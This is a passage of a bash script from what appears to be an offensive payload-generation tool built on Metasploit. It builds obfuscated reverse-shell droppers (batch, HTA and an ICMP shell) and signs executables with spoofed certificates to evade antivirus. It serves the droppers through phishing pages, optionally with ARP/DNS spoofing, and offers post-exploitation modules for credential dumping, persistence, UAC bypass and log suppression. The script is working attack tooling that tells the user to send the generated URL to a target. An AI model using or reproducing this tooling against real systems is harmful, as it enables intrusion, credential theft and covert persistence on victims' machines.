           mv final.log $N4m-$lhost.log > /dev/null 2>&1
           rm report.log > /dev/null 2>&1
           cd $IPATH/
         else

           if [ "$paylo" = "windows/meterpreter/reverse_winhttps" ] || [ "$paylo" = "windows/meterpreter/reverse_https" ] || [ "$paylo" = "windows/x64/meterpreter/reverse_https" ]; then
             xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set HandlerSSLCert $IPATH/obfuscate/www.gmail.com.pem; set StagerVerifySSLCert true; exploit'"
           else
             xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; exploit'"
           fi
         fi

sleep 2
# CLEANING EVERYTHING UP
echo "[☠] Cleanning temp generated files..."
rm $IPATH/output/chars.raw > /dev/null 2>&1
mv $IPATH/templates/template.bak $IPATH/templates/template.xml > /dev/null 2>&1
mv $IPATH/templates/installer.bak $IPATH/templates/installer.bat > /dev/null 2>&1
sleep 2
clear
cd $IPATH/

else

  echo ${RedF}[x]${white} Abort module execution ..${Reset};
  sleep 2
  sh_microsoft_menu
  clear
fi
}




# ----------------------------------------------------
# build shellcode in PSH-CMD (windows BAT) ReL1K :D 
# to use certutil.exe download/exec in hta trigger
# ----------------------------------------------------
sh_certutil () {

# chose to use venom to build the payload or input your own binary.exe
chose=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "This module takes advantage of powershell DownloadFile() to remote download/exec agent.\n\nThis module builds one agent.bat (psh-cmd) OR\nasks for the full path of the agent.exe to be used" --radiolist --column "Pick" --column "Option" TRUE "Build venom agent.bat" FALSE "The full path of your agent.exe" --width 350 --height 270) > /dev/null 2>&1
if [ "$?" -eq "0" ]; then

# get user input to build shellcode
echo "[☠] Enter shellcode settings!"
lhost=$(zenity --title="☠ Enter LHOST ☠" --text "example: $IP" --entry --width 300) > /dev/null 2>&1
lport=$(zenity --title="☠ Enter LPORT ☠" --text "example: 666" --entry --width 300) > /dev/null 2>&1

# input payload choise
paylo=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "\nAvailable Payloads:" --radiolist --column "Pick" --column "Option" TRUE "windows/shell_bind_tcp" FALSE "windows/shell/reverse_tcp" FALSE "windows/meterpreter/reverse_tcp" FALSE "windows/meterpreter/reverse_tcp_dns" FALSE "windows/meterpreter/reverse_http" FALSE "windows/meterpreter/reverse_https" FALSE "windows/meterpreter/reverse_winhttps" FALSE "windows/x64/meterpreter/reverse_tcp" FALSE "windows/x64/meterpreter/reverse_https" --width 350 --height 370) > /dev/null 2>&1
# input payload name
N4m=$(zenity --entry --title "☠ SHELLCODE NAME ☠" --text "Enter shellcode output name\nexample: ReL1K" --width 300) > /dev/null 2>&1
# input payload (agent) remote upload directory
D1r=$(zenity --title="☠ Enter remote upload dir ☠" --text "The remote directory where to upload agent.\nWARNING:chose allways rewritable directorys\nWARNING:Use only Windows Enviroment Variables\n\nexample: %tmp%" --entry --width 330) > /dev/null 2>&1


## setting default values in case user have skip this ..
if [ -z "$lhost" ]; then lhost="$IP";fi
if [ -z "$lport" ]; then lport="443";fi
if [ -z "$N4m" ]; then N4m="ReL1K";fi
if [ -z "$D1r" ]; then D1r="%tmp%";fi

#
# check if remote path was inputed correctlly (only enviroment variables accepted)
#
chec=`echo "$D1r" | grep "%"`
# verify if '$chec' local var contains the '%' string (enviroment variable)
if [ -z "$chec" ]; then
  echo "[x] WARNING: remote directory not supported .."
  echo "[✔] Setting remote upload directory to:%tmp%"
  D1r="%tmp%"
  sleep 2
fi



echo "[☠] Loading powershell DownloadFile()"
sleep 1
if [ "$chose" = "Build venom agent.bat" ]; then
echo "[☠] Building shellcode -> psh-cmd format ..."
sleep 2

  if [ "$paylo" = "windows/meterpreter/reverse_winhttps" ] || [ "$paylo" = "windows/meterpreter/reverse_https" ]; thenif [ "$paylo" = "windows/meterpreter/reverse_winhttps" ] || [ "$paylo" = "windows/meterpreter/reverse_https" ] || [ "$paylo" = "windows/x64/meterpreter/reverse_https" ]; then
    echo "[☠] meterpreter over SSL sellected .."
    sleep 1
  fi

# display final settings to user
cat << !

    venom settings
    ╔─────────────────────
    | LPORT   : $lport
    | LHOST   : $lhost
    | FORMAT  : PSH-CMD -> WINDOWS(bat)
    | PAYLOAD : $paylo
    |_AGENT   : $IPATH/output/$N4m.bat

!

#
# use metasploit to build shellcode
# HINT: use -n to add extra bits (random) of nopsled data to evade signature detection
#
KEYID=$(cat /dev/urandom | tr -dc '13' | fold -w 3 | head -n 1)
if [ "$paylo" = "windows/meterpreter/reverse_winhttps" ] || [ "$paylo" = "windows/meterpreter/reverse_https" ] || [ "$paylo" = "windows/x64/meterpreter/reverse_https" ]; then
   xterm -T " SHELLCODE GENERATOR " -geometry 110x23 -e "msfvenom -p $paylo LHOST=$lhost LPORT=$lport HandlerSSLCert=$IPATH/obfuscate/www.gmail.com.pem StagerVerifySSLCert=true -f psh-cmd -n 20 > $IPATH/output/chars.raw"
else
   xterm -T " SHELLCODE GENERATOR " -geometry 110x23 -e "msfvenom -p $paylo LHOST=$lhost LPORT=$lport -f psh-cmd -n $KEYID > $IPATH/output/chars.raw"
fi
disp=`cat $IPATH/output/chars.raw | awk {'print $12'}`

# display shellcode
echo ""
echo "[☠] Obfuscating -> base64 encoded!"
sleep 2
echo $disp
echo ""
sleep 2

# EDITING/BACKUP FILES NEEDED
echo ""
echo "[☠] Editing/backup files..."
cp $InJEc7 $IPATH/templates/hta_attack/index[bak].html
sleep 2

   # check if chars.raw as generated
   if [ -e $Ch4Rs ]; then
      echo "[☠] chars.raw -> found!"
      sleep 2
 
   else

      echo "[☠] chars.raw -> not found!"
      exit
      fi


# injecting shellcode into name.bat
cd $IPATH/output/
echo "[☠] Parsing agent shellcode data .."
sleep 1
echo "[☠] Injecting shellcode into: $N4m.bat"
sleep 2
OBF=$(zenity --list --title "☠ AGENT STRING OBFUSCATION ☠" --text "Obfuscate the agent [ template ] command arguments ?\nUsing special escape characters, whitespaces, concaternation, amsi\nsandbox evasion and variables piped and de-obfuscated at runtime\n'The agent will delay 3 sec is execution to evade sandbox detection'" --radiolist --column "Pick" --column "Option" TRUE "None-Obfuscation (default)" FALSE "String Obfuscation (3 sec)" --width 353 --height 245) > /dev/null 2>&1
if [ "$OBF" = "None-Obfuscation (default)" ]; then
echo "@echo off&&cmd.exe /c powershell.exe -nop -exec bypass -w 1 -noni -enc $disp" > $N4m.bat
else
echo "[✔] String obfuscation technic sellected .."
# OBFUSCATE SYSCALLS (evade AV/AMSI + SandBox Detection)
# https://github.com/r00t-3xp10it/hacking-material-books/blob/master/obfuscation/simple_obfuscation.md
# HINT: setting -ExecutionPolicy/-ep is redundant since -EncodedCommand/-enc automatically bypasses the execution policy
#
# STRING: cmd.exe /c powershell.exe -NoPRo -wIN 1 -nONi -eN $disp
echo "@e%!%ch^O ,;, Of^f&&(,(,, (,;Co%LD%p%La%y %windir%\\\Le%!HuB!%git^Che%i%ck^Co%U%nt%-3%rol\".\"d^ll %temp%\\key^s\\Le^git^C%OM%he^ck^Cont%-R%rol.t^m%A%p));,, )&,( (,, @pi%!h%n^g -^n 4 w%%!hw^w.mi^cro%d0b%sof^t.c^o%OI%m > %tmp%\\lic%dR%e^ns%at%e.p^em);, ,) &&,(, (,,%$'''%, (,;c^Md%i%\".\"e%i0%X^e ,,/^R =c^O%Unt-8%p^Y /^Y %windir%\\Sy^s%dE%te^m%-%32\\Win^do%'''%w^s%AT%Power%Off%s^he%$'''%ll\\\v1.0\\p^o%IN%we^rs^%-iS%hell.e%!'''$%x%-i%e ,;^, %tmp%\\W^UAU%-Key%CTL.m%$%s%$'''%c &&,,, @c^d ,, %tmp% && ,;WU%VoiP%AUC%$,,,,%TL.m%-8%s^c /^No%db%PR^o  /w%Eb%\"I\"^N 1 /^%$'''%n\"O\"N%Func%i  /^eN%GL% $disp),) %i% ,,)" > $N4m.bat
fi
chmod +x $IPATH/output/$N4m.bat
N4m="$N4m.bat"


else


#
# store user inputed full path into UpL local variable ..
#
UpL=$(zenity --title "☠ INPUT FULL PATH OF PAYLOAD.EXE ☠" --filename=$IPATH --file-selection --text "chose payload.exe to be used") > /dev/null 2>&1
# display final settings to user
cat << !

    venom settings
    ╔─────────────────────
    | LPORT   : $lport
    | LHOST   : $lhost
    | FORMAT  : EXE -> WINDOWS(exe)
    | PAYLOAD : $paylo
    |_BINARY  : $UpL

!

   #
   # grab only the executable name from the full inputed path
   # ^/ (search for expression) +$ (print only last espression)
   #
   echo "[☠] Parsing agent filename data .."
   sleep 2
   echo "$UpL" > test.txt
   N4m=`grep -oE '[^/]+$' test.txt` > /dev/null 2>&1 # payload.exe
   rm test.txt > /dev/null 2>&1
   echo "[☠] Copy $N4m to output folder .."
   sleep 1
   cp $UpL $IPATH/output/$N4m > /dev/null 2>&1

fi


# build trigger.hta 
cd $IPATH/templates
echo "[☠] Building trigger.hta script .."
sleep 2
if [ "$chose" = "Build venom agent.bat" ]; then
  sed "s|IpAdR|$lhost|" template.hta > trigger.hta
  sed -i "s/NoMe/$N4m/g" trigger.hta
  sed -i "s/RdI/$D1r/g" trigger.hta
  mv trigger.hta $IPATH/output/EasyFileSharing.hta > /dev/null 2>&1
else
  sed "s|IpAdR|$lhost|" template_exe.hta > trigger.hta
  sed -i "s/NoMe/$N4m/g" trigger.hta
  sed -i "s/RdI/$D1r/g" trigger.hta
  mv trigger.hta $IPATH/output/EasyFileSharing.hta > /dev/null 2>&1
fi
echo "[☠] Remote upload agent path sellected:$D1r"
sleep 2
#
# copy all files to apache2 webroot ..
#
echo "[☠] Copy files to apache2 webroot .."
sleep 1
cp $IPATH/output/EasyFileSharing.hta $ApAcHe/EasyFileSharing.hta > /dev/null 2>&1
cp $IPATH/output/$N4m $ApAcHe/$N4m > /dev/null 2>&1
cd $IPATH/output



# CHOSE HOW TO DELIVER YOUR PAYLOAD
serv=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "Payload stored:\n$IPATH/output/$N4m\n\nstore $N4m + EasyFileSharing.hta into apache and deliver\nURL pointing to the hta file or use apache2 (malicious url)" --radiolist --column "Pick" --column "Option" TRUE "multi-handler (default)" FALSE "apache2 (malicious url)" --width 305 --height 260) > /dev/null 2>&1

   if [ "$serv" = "multi-handler (default)" ]; then
      # START METASPLOIT LISTENNER (multi-handler with the rigth payload)
      echo "[☠] Start a multi-handler..."
      echo "[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
      echo "[☯] Please dont test samples on virus total..."
        if [ "$MsFlF" = "ON" ]; then

          if [ "$chose" = "Build venom agent.bat" ] && [ "$paylo" = "windows/meterpreter/reverse_winhttps" ]; then
            xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set HandlerSSLCert $IPATH/obfuscate/www.gmail.com.pem; set StagerVerifySSLCert true; exploit'"
          else
            xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; exploit'"
          fi

          cd $IPATH/output
          # delete utf-8/non-ancii caracters from output
          tr -cd '\11\12\15\40-\176' < report.log > final.log
          sed -i "s/\[0m//g" final.log
          sed -i "s/\[1m\[34m//g" final.log
          sed -i "s/\[4m//g" final.log
          sed -i "s/\[K//g" final.log
          sed -i "s/\[1m\[31m//g" final.log
          sed -i "s/\[1m\[32m//g" final.log
          sed -i "s/\[1m\[33m//g" final.log
          mv final.log $N4m-$lhost.log > /dev/null 2>&1
          rm report.log > /dev/null 2>&1
          cd $IPATH/
        else

          if [ "$chose" = "Build venom agent.bat" ] && [ "$paylo" = "windows/meterpreter/reverse_winhttps" ]; then
            xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set HandlerSSLCert $IPATH/obfuscate/www.gmail.com.pem; set StagerVerifySSLCert true; exploit'"
          else
            xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; exploit'"
          fi
        fi
      sleep 2


   else


P0=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "\npost-exploitation module to run" --radiolist --column "Pick" --column "Option" TRUE "sysinfo.rc" FALSE "enum_system.rc" FALSE "dump_credentials.rc" FALSE "fast_migrate.rc" FALSE "persistence.rc" FALSE "privilege_escalation.rc" FALSE "stop_logfiles_creation.rc" FALSE "exploit_suggester.rc" --width 305 --height 350) > /dev/null 2>&1

  if [ "$P0" = "persistence.rc" ]; then
  M1P=$(zenity --entry --title "☠ AUTO-START PAYLOAD ☠" --text "\nAuto-start payload Every specified hours 1-23\n\nexample: 23\nwill auto-start $N4m on target every 23 hours" --width 300) > /dev/null 2>&1

    cd $IPATH/aux
    # Build persistence script (AutoRunStart='multi_console_command -r')
    cp persistence.rc persistence[bak].rc
    sed -i "s|N4m|$N4m|g" persistence.rc
    sed -i "s|IPATH|$IPATH|g" persistence.rc
    sed -i "s|M1P|$M1P|g" persistence.rc

    # Build listenner resource file
    echo "use exploit/multi/handler" > $lhost.rc
    echo "set LHOST $lhost" >> $lhost.rc
    echo "set LPORT $lport" >> $lhost.rc
    echo "set PAYLOAD $paylo" >> $lhost.rc
    echo "exploit" >> $lhost.rc
    mv $lhost.rc $IPATH/output/$lhost.rc
    cd $IPATH

    elif [ "$P0" = "privilege_escalation.rc" ]; then
      cd $IPATH/aux
      # backup files needed
      cp privilege_escalation.rc privilege_escalation[bak].rc
      cp enigma_fileless_uac_bypass.rb enigma_fileless_uac_bypass[bak].rb
      # Build resource files needed
      sed -i "s|N4m|$N4m|g" privilege_escalation.rc
      sed -i "s|IPATH|$IPATH|g" privilege_escalation.rc
      sed -i "s|N4m|$N4m|g" enigma_fileless_uac_bypass.rb
      # reload metasploit database
      echo "[☠] copy post-module to msf db!"
      cp enigma_fileless_uac_bypass.rb $pHanTom/post/windows/escalate/enigma_fileless_uac_bypass.rb
      echo "[☠] reloading -> Metasploit database!"
      xterm -T " reloading -> Metasploit database " -geometry 110x23 -e "sudo msfconsole -x 'reload_all; exit -y'" > /dev/null 2>&1
      cd $IPATH

  elif [ "$P0" = "stop_logfiles_creation.rc" ]; then
    #
    # check if dependencies exist ..
    #
    if [ -e "$pHanTom/post/windows/manage/Invoke-Phant0m.rb" ]; then
      echo "[☠] Invoke-Phant0m.rb installed .."
      sleep 2
    else
      echo "[x] Invoke-Phant0m.rb not found .."
      sleep 2
      echo "[☠] copy Invoke-Phant0m.rb to msfdb .."
      sleep 2
      cp $IPATH/aux/msf/Invoke-Phant0m.rb $pHanTom/post/windows/manage/Invoke-Phant0m.rb > /dev/null 2>&1
      echo "[☠] Reloading msfdb database .."
      sleep 2
      xterm -T "RELOADING MSF DATABASE" -geometry 110x23 -e "msfdb reinit" > /dev/null 2>&1
      xterm -T "RELOADING MSF DATABASE" -geometry 110x23 -e "msfconsole -q -x 'db_status; reload_all; exit -y'" > /dev/null 2>&1
    fi

      #
      # check if Invoke-Phantom.ps1 exists ..
      #
      if [ -e "$IPATH/aux/Invoke-Phant0m.ps1" ]; then
        echo "[☠] Invoke-Phant0m.ps1 found .."
        sleep 2
        cp $IPATH/aux/Invoke-Phant0m.ps1 /tmp/Invoke-Phant0m.ps1 > /dev/null 2>&1
      else
        echo "[x] Invoke-Phant0m.ps1 not found .."
        sleep 2
        echo "[☠] Please place module in $IPATH/aux folder .."
        sleep 2
        exit
      fi


  else

    echo "do nothing" > /dev/null 2>&1

fi

      # edit files nedded
      cd $IPATH/templates/phishing
      cp $InJEc12 mega[bak].html
      sed "s|NaM3|$N4m|g" mega.html > copy.html
      cp copy.html $ApAcHe/index.html > /dev/null 2>&1
      cd $IPATH/output
      cp $IPATH/output/$N4m $ApAcHe/$N4m > /dev/null 2>&1
      echo "[☠] loading -> Apache2Server!"
      echo "---"
      echo "- SEND THE URL GENERATED TO TARGET HOST"

        if [ "$D0M4IN" = "YES" ]; then
        # copy files nedded by mitm+dns_spoof module
        sed "s|NaM3|$N4m|" $IPATH/templates/phishing/mega.html > $ApAcHe/index.html
        cp $IPATH/output/$N4m $ApAcHe/$N4m
        echo "- ATTACK VECTOR: http://mega-upload.com/EasyFileSharing.hta"
        echo "- POST EXPLOIT : $P0"
        echo "---"
        # START METASPLOIT LISTENNER (multi-handler with the rigth payload)
        echo "[☠] Start a multi-handler..."
        echo "[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
        echo "[☯] Please dont test samples on virus total..."
          if [ "$MsFlF" = "ON" ]; then

            if [ "$chose" = "Build venom agent.bat" ] && [ "$paylo" = "windows/meterpreter/reverse_winhttps" ]; then
              xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set HandlerSSLCert $IPATH/obfuscate/www.gmail.com.pem; set StagerVerifySSLCert true; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'" & xterm -T " DNS_SPOOF [redirecting traffic] " -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
            else
              xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'" & xterm -T " DNS_SPOOF [redirecting traffic] " -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
            fi

            cd $IPATH/output
            # delete utf-8/non-ancii caracters from output
            tr -cd '\11\12\15\40-\176' < report.log > final.log
            sed -i "s/\[0m//g" final.log
            sed -i "s/\[1m\[34m//g" final.log
            sed -i "s/\[4m//g" final.log
            sed -i "s/\[K//g" final.log
            sed -i "s/\[1m\[31m//g" final.log
            sed -i "s/\[1m\[32m//g" final.log
            sed -i "s/\[1m\[33m//g" final.log
            mv final.log $N4m-$lhost.log > /dev/null 2>&1
            rm report.log > /dev/null 2>&1
            cd $IPATH/
          else

            if [ "$chose" = "Build venom agent.bat" ] && [ "$paylo" = "windows/meterpreter/reverse_winhttps" ]; then
              xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set HandlerSSLCert $IPATH/obfuscate/www.gmail.com.pem; set StagerVerifySSLCert true; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'" & xterm -T " DNS_SPOOF [redirecting traffic] " -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
            else
            xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'" & xterm -T " DNS_SPOOF [redirecting traffic] " -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
            fi
          fi


        else


        echo "- ATTACK VECTOR: http://$lhost/EasyFileSharing.hta"
        echo "- POST EXPLOIT : $P0"
        echo "---"
        # START METASPLOIT LISTENNER (multi-handler with the rigth payload)
        echo "[☠] Start a multi-handler..."
        echo "[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
        echo "[☯] Please dont test samples on virus total..."
          if [ "$MsFlF" = "ON" ]; then

            if [ "$chose" = "Build venom agent.bat" ] && [ "$paylo" = "windows/meterpreter/reverse_winhttps" ]; then
              xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set HandlerSSLCert $IPATH/obfuscate/www.gmail.com.pem; set StagerVerifySSLCert true; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'"
            else
              xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'"
            fi

            cd $IPATH/output
            # delete utf-8/non-ancii caracters from output
            tr -cd '\11\12\15\40-\176' < report.log > final.log
            sed -i "s/\[0m//g" final.log
            sed -i "s/\[1m\[34m//g" final.log
            sed -i "s/\[4m//g" final.log
            sed -i "s/\[K//g" final.log
            sed -i "s/\[1m\[31m//g" final.log
            sed -i "s/\[1m\[32m//g" final.log
            sed -i "s/\[1m\[33m//g" final.log
            mv final.log $N4m-$lhost.log > /dev/null 2>&1
            rm report.log > /dev/null 2>&1
            cd $IPATH/
          else

            if [ "$chose" = "Build venom agent.bat" ] && [ "$paylo" = "windows/meterpreter/reverse_winhttps" ]; then
              xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set HandlerSSLCert $IPATH/obfuscate/www.gmail.com.pem; set StagerVerifySSLCert true; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'"
            else
              xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'"
            fi
          fi
        fi
   fi


sleep 2
# CLEANING EVERYTHING UP
echo "[☠] Cleanning temp generated files..."
mv $IPATH/templates/phishing/mega[bak].html $InJEc12 > /dev/null 2>&1
mv $IPATH/aux/privilege_escalation[bak].rc $IPATH/aux/privilege_escalation.rc > /dev/null 2>&1
mv $IPATH/aux/msf/enigma_fileless_uac_bypass[bak].rb $IPATH/aux/msf/enigma_fileless_uac_bypass.rb > /dev/null 2>&1
mv $IPATH/aux/persistence[bak].rc $IPATH/aux/persistence.rc > /dev/null 2>&1
rm $IPATH/templates/phishing/copy.html > /dev/null 2>&1
rm $IPATH/output/chars.raw > /dev/null 2>&1
rm $ApAcHe/$N4m > /dev/null 2>&1
rm $ApAcHe/EasyFileSharing.hta > /dev/null 2>&1
rm $ApAcHe/index.html > /dev/null 2>&1
rm /tmp/Invoke-Phant0m.ps1 > /dev/null 2>&1
sleep 2
clear
cd $IPATH/

else

  echo ${RedF}[x]${white} Abort module execution ..${Reset};
  sleep 2
  sh_microsoft_menu
  clear
fi
}




# ------------------------------------
# ICMP (ping) REVERSE SHELL
# original project by: @Daniel Compton
# -
# This module introduces the changing of payload.exe finalname,
# builds dropper.bat (remote download/exc of payload.exe) and
# port all files to apache2 webroot, to trigger URL access download.
# ------------------------------------
sh_icmp_shell () {
# get user input to build agent
echo "[☠] Enter module settings!"
lhost=$(zenity --title="☠ Enter LHOST (local ip) ☠" --text "example: $IP" --entry --width 300) > /dev/null 2>&1
target=$(zenity --title="☠ Enter RHOST (target ip) ☠" --text "example: 192.168.1.72" --entry --width 300) > /dev/null 2>&1
N4m=$(zenity --title="☠ Enter Dropper FileName ☠" --text "example: dropper" --entry --width 300) > /dev/null 2>&1
slave=$(zenity --title="☠ Enter Payload FileName ☠" --text "example: icmpsh\nRemark: DONT start the name with [ f ] character .." --entry --width 300) > /dev/null 2>&1
rpath=$(zenity --title="☠ Enter Upload Path (target dir) ☠" --text "example: %tmp%\nexample: %userprofile%\\\\\\\Desktop" --entry --width 350) > /dev/null 2>&1

## setting default values in case user have skip this ..
if [ -z "$lhost" ]; then lhost="$IP";fi
if [ -z "$N4m" ]; then N4m="dropper";fi
if [ -z "$rpath" ]; then rpath="%tmp%";fi
if [ -z "$slave" ]; then slave="icmpsh";fi
if [ -z "$target" ]; then
   echo "${RedF}[x]${white} We must provide the [${RedF} target ${white}] ip address ([${RedF}ERR${white}])"
   sleep 3; sh_exit
fi
ext=$(echo $slave|cut -c 1)
if [ "$ext" = "f" ]; then
   echo "${RedF}[x]${white} Payload name must NOT start with [${RedF} f ${white}] character ([${RedF}ERR${white}])"
   sleep 3; sh_exit
fi


# display final settings to user
cat << !

    venom settings
    ╔─────────────────────
    | LHOST  : $lhost
    | TARGET : $target
    | UPLOAD : $rpath\\$slave.exe
    | FORMAT : ICMP (ping) Reverse Shell
    |_DISCLOSURE: @Daniel Compton

!
sleep 2
## Disable ICMP ping replies
echo "[☠] Checking ICMP replies status ..";sleep 1
LOCALICMP=$(cat /proc/sys/net/ipv4/icmp_echo_ignore_all)
if [ "$LOCALICMP" -eq 0 ]; then
   echo "${RedF}[x]${white} ICMP Replies enabled (disable temporarily [${GreenF}OK${white}])${white}"
   sysctl -w net.ipv4.icmp_echo_ignore_all=1 > /dev/null 2>&1
   ICMPDIS="disabled";sleep 2
fi


## Build batch dropper
echo "[☠] Building batch dropper '$N4m.bat' ..";sleep 2
echo "@echo off" > $IPATH/output/$N4m.bat
echo "echo Please Wait, Installing Software .." >> $IPATH/output/$N4m.bat
echo "powershell -w 1 -C \"(new-Object Net.WebClient).DownloadFile('http://$lhost/$slave.exe', '$rpath\\$slave.exe')\" && start $rpath\\$slave.exe -t $lhost -d 500 -b 30 -s 128" >> $IPATH/output/$N4m.bat
echo "exit" >> $IPATH/output/$N4m.bat


## Writting ICMP reverse shell to output
echo "[☠] Writting ICMP reverse shell to output ..";sleep 2
cp $IPATH/bin/icmpsh/icmpsh.exe $IPATH/output/$slave.exe > /dev/nul 2>&1


## Make sure CarbonCopy dependencies are installed
ossl_packer=`which osslsigncode`
if ! [ "$?" -eq "0" ]; then
  echo "${RedF}[x]${white} osslsigncode Package not found, installing .."${Reset};sleep 2
  echo "" && sudo apt-get install osslsigncode && pip3 install pyopenssl && echo ""
fi


## SIGN EXECUTABLE (paranoidninja - CarbonCopy)
echo "[☠] Sign Executable for AV Evasion (CarbonCopy) ..";sleep 2
# random produces a number from 1 to 6
conv=$(cat /dev/urandom | tr -dc '1-6' | fold -w 1 | head -n 1)
# if $conv number output 'its small than' number 3 ...
if [ "$conv" "<" "3" ]; then SSL_domain="www.microsoft.com"; else SSL_domain="www.asus.com"; fi
echo "${BlueF}[${YellowF}i${BlueF}]${white} spoofed certificate: $SSL_domain"${Reset};sleep 2
cd $IPATH/obfuscate
xterm -T "VENOM - Signs an Executable for AV Evasion" -geometry 110x23 -e "python3 CarbonCopy.py $SSL_domain 443 $IPATH/output/$slave.exe $IPATH/output/signed-$slave.exe && sleep 2"
mv $IPATH/output/signed-$slave.exe $IPATH/output/$slave.exe
rm -r certs > /dev/nul 2>&1


## Copy ALL files to apache2 webroot
echo "[☠] Porting ALL files to apache2 webroot ..";sleep 2
cp $IPATH/output/$slave.exe $ApAcHe/$slave.exe > /dev/nul 2>&1
cp $IPATH/output/$N4m.bat $ApAcHe/$N4m.bat > /dev/nul 2>&1


## Print attack vector on terminal
echo "[☠] Starting apache2 webserver ..";sleep 1
echo "---"
echo "- ${YellowF}SEND THE URL GENERATED TO TARGET HOST${white}"
echo "- ATTACK VECTOR: http://$lhost/$N4m.bat"
echo "---"
echo "[☠] Launching Listener, waiting for inbound connection ..";sleep 1
cd $IPATH/bin/icmpsh
xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "python icmpsh_m.py $lhost $target"
cd $IPATH


## Enable ICMP ping replies
# ONLY IF.. they have been disabled before.
if [ "$ICMPDIS" = "disabled" ]; then
   echo "${white}[${GreenF}✔${white}] Enabling Local ICMP Replies again ([${GreenF}OK${white}])${white}";sleep 2
   sysctl -w net.ipv4.icmp_echo_ignore_all=0 > /dev/null 2>&1
fi


## Clean recent files
echo "[☠] Cleanning temp generated files ..";sleep 2
rm $IPATH/output/icmpsh.exe > /dev/nul 2>&1
rm $ApAcHe/$N4m.bat > /dev/nul 2>&1
rm $ApAcHe/$slave.exe > /dev/nul 2>&1
cd $IPATH
zenity --title="☠ ICMP (ping) Reverse Shell ☠" --text "REMARK:\nRemmenber to delete '$slave.exe'\nslave (client) from target system." --info --width 350 > /dev/null 2>&1
}





# -----------------------------
# INTERACTIVE SHELLS (built-in) 
# ----------------------------- 
sh_buildin () {
QuE=$(zenity --question --title "☠ BUILT-IN SHELL GENERATOR ☠" --text "This module uses system built-in tools sutch as:\n'bash, netcat, ssh, python, perl, js, powershell'\nAnd use them to spaw a tcp connection.\n\nrun module?" --width 320) > /dev/null 2>&1
     if [ "$?" -eq "0" ]; then

cat << !

    OPTION    DESCRIPTION                   TARGET OS
    ------    -----------                   ---------
    1         simple ssh shell              Windows
    2         simple bash shell             Linux|Bsd|OSx
    3         simple reverse bash shell     Linux|Bsd|OSx
    4         simple reverse netcat shell   Windows
    5         simple reverse python shell   Linux|Bsd|Solaris|OSx|Windows
    6         simple reverse python shell2  Linux|Bsd|Solaris|OSx|Windows
    7         simple powershell shell       Windows
    8         simple php reverse shell      Web-Servers
    9         ruby Reverse_bash_shell       Linux
    10        ruby Reverse_bash_shell2      Linux
    11        perl-reverse-shell            Linux|Windows
    12        node.js reverse shell         Windows
   [ M ]      return to previous menu

!
sleep 1
echo -n "${BlueF}[${GreenF}➽${BlueF}]${white} Chose Option number:"${Reset};
read InSh3ll

